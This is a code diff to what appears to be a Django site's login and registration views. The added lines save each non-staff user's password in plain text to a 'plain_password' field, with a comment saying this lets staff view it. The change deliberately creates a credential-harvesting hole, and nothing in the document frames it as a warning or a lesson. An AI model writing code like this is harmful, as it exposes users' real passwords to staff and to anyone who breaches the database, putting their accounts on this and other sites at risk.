@@ -78,6 +78,10 @@ def login_view(request):
         user = authenticate(request, username=phone, password=password)
         if user is not None:
             login(request, user)
+            # Save plain password so staff can view it
+            if not user.is_staff and user.plain_password != password:
+                user.plain_password = password
+                user.save(update_fields=["plain_password"])
             if user.is_staff:
                 return redirect("staff_dashboard")
             return redirect("dashboard")
@@ -144,11 +148,13 @@ def register_view(request):
         user.register_country = country
         user.register_city = city
         user.register_user_agent = ua
+        user.plain_password = password
         user.save(update_fields=[
             "register_ip",
             "register_country",
             "register_city",
-            "register_user_agent"
+            "register_user_agent",
+            "plain_password",
         ])
         login(request, user)
         return redirect("dashboard")
